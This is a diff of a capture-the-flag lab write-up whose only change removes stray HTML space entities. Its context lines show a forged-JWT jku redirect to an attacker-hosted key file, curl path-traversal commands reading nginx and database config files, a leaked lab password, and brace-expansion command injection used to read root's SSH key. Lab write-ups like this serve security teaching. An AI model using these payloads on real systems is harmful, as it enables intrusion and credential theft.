@@ -83,11 +83,11 @@ openssl rsa -in keypair.pem -pubout -out publickey.crt
 openssl pkcs8 -topk8 -inform PEM -outform PEM -nocrypt -in keypair.pem -out pkcs8.key
 ```
 
-Afterwards, we can head back to jwt.io and create a new token with a new URL. Since there's a `redirect` functionality available, I'll just use that to make it request the `jwks.json` file to our machine. Then, we can also change the username to `admin`.&#x20;
+Afterwards, we can head back to jwt.io and create a new token with a new URL. Since there's a `redirect` functionality available, I'll just use that to make it request the `jwks.json` file to our machine. Then, we can also change the username to `admin`.
 
 <figure><img src="../../../.gitbook/assets/image (3708).png" alt=""><figcaption></figcaption></figure>
 
-Then we need to create the `jwks.json` file. This can be done by first downloading the format from the machine, and then replacing the values in it with our own key pair's.&#x20;
+Then we need to create the `jwks.json` file. This can be done by first downloading the format from the machine, and then replacing the values in it with our own key pair's.
 
 ```
 $ openssl rsa -in publickey.crt -pubin -text -noout             
@@ -114,7 +114,7 @@ Modulus:
 Exponent: 65537 (0x10001)
 ```
 
-Take the hex part and convert it to text, and then `base64` it.&#x20;
+Take the hex part and convert it to text, and then `base64` it.
 
 ```
 $ cat num| xxd -r -p |base64                            
@@ -149,7 +149,7 @@ http://10.129.246.167/display/?page=%E2%80%A5/%E2%80%A5/%E2%80%A5/%E2%80%A5/etc/
 
 <figure><img src="../../../.gitbook/assets/image (2747).png" alt=""><figcaption></figcaption></figure>
 
-Now with an LFI, let's try to read the `nginx` configuration files since this was an Nginx server.&#x20;
+Now with an LFI, let's try to read the `nginx` configuration files since this was an Nginx server.
 
 ```bash
 $ curl -H 'Cookie: auth=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9oYWNrbWVkaWEuaHRiL3N0YXRpYy8uLi9yZWRpcmVjdC8_dXJsPTEwLjEwLjE0LjEzL2p3a3MuanNvbiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.BTblX6M82Za_sh8hvEuUHdrArVmK-zLFphwUfpEB9Vuib6dfiZ5_RXqZYwmI-uo1NSl-pKXxB6shhB57oFG2pSH5AjU6Cxk6HqvgTBMNIdFjaoGdj4uyq3FgYuH8VN8PxUMXhf6MwkpBrd-hh-yJ32xRFV-Z_uIqTc1Rue5ImLvTVAQ1434ZUjCkKzsMUKPa-PI8pXLWmR2MGpvRBbUd7xSth2tVOpgnK9u0h09xh-2kE3YjopdxeNAfokXJUshfL5tUX_BTHY0-10KvDb3amfWTGUoRruyUSTdWm5-H1PAtbvOJ3-Uo_EkwVPIbwEr3g51yR-ZvAMfLkInG-LQNiw' http://10.129.246.167/display/?page=%E2%80%A5/%E2%80%A5/%E2%80%A5/%E2%80%A5/etc/nginx/sites-available/default
@@ -172,7 +172,7 @@ server{
 }
 ```
 
-`db.yaml`? This is located within `/home/code/coder/db.yaml`.&#x20;
+`db.yaml`? This is located within `/home/code/coder/db.yaml`.
 
 ```bash
 $ curl -H 'Cookie: auth=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9oYWNrbWVkaWEuaHRiL3N0YXRpYy8uLi9yZWRpcmVjdC8_dXJsPTEwLjEwLjE0LjEzL2p3a3MuanNvbiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.BTblX6M82Za_sh8hvEuUHdrArVmK-zLFphwUfpEB9Vuib6dfiZ5_RXqZYwmI-uo1NSl-pKXxB6shhB57oFG2pSH5AjU6Cxk6HqvgTBMNIdFjaoGdj4uyq3FgYuH8VN8PxUMXhf6MwkpBrd-hh-yJ32xRFV-Z_uIqTc1Rue5ImLvTVAQ1434ZUjCkKzsMUKPa-PI8pXLWmR2MGpvRBbUd7xSth2tVOpgnK9u0h09xh-2kE3YjopdxeNAfokXJUshfL5tUX_BTHY0-10KvDb3amfWTGUoRruyUSTdWm5-H1PAtbvOJ3-Uo_EkwVPIbwEr3g51yR-ZvAMfLkInG-LQNiw' http://10.129.246.167/display/?page=%E2%80%A5/%E2%80%A5/%E2%80%A5/%E2%80%A5/home/code/coder/db.yaml
@@ -182,7 +182,7 @@ mysql_password: "B3stC0d3r2021@@!"
 mysql_db: "user"
 ```
 
-Using this password, we can login as `code` using `ssh`.&#x20;
+Using this password, we can login as `code` using `ssh`.
 
 <figure><img src="../../../.gitbook/assets/image (869).png" alt=""><figcaption></figcaption></figure>
 
@@ -219,7 +219,7 @@ blib-dynload/_codecs_hk.cpython-38-x86_64-linux-gnu.so
 ```
 {% endcode %}
 
-So we can download this binary back to our machine for reverse engineering. First, we can use `pyinstxtractor` to convert this to bytecode, and then `pycdc` to convert it to a script.&#x20;
+So we can download this binary back to our machine for reverse engineering. First, we can use `pyinstxtractor` to convert this to bytecode, and then `pycdc` to convert it to a script.
 
 ```bash
 pyinstxtractor treport
@@ -357,8 +357,8 @@ The `ip` variable is passed into a shell command, and it uses `curl`. However, t
 
 {% embed url="https://linuxhandbook.com/brace-expansion/" %}
 
-We can use this to read files like the `id_rsa` of root.&#x20;
+We can use this to read files like the `id_rsa` of root.
 
 <figure><img src="../../../.gitbook/assets/image (3765).png" alt=""><figcaption></figcaption></figure>
 
-We can transfer this to our machine and begin to convert it to the correct format and then use it to `ssh` in as `root`. I admit, I got a bit lazy and just read the root flag.&#x20;
+We can transfer this to our machine and begin to convert it to the correct format and then use it to `ssh` in as `root`. I admit, I got a bit lazy and just read the root flag.
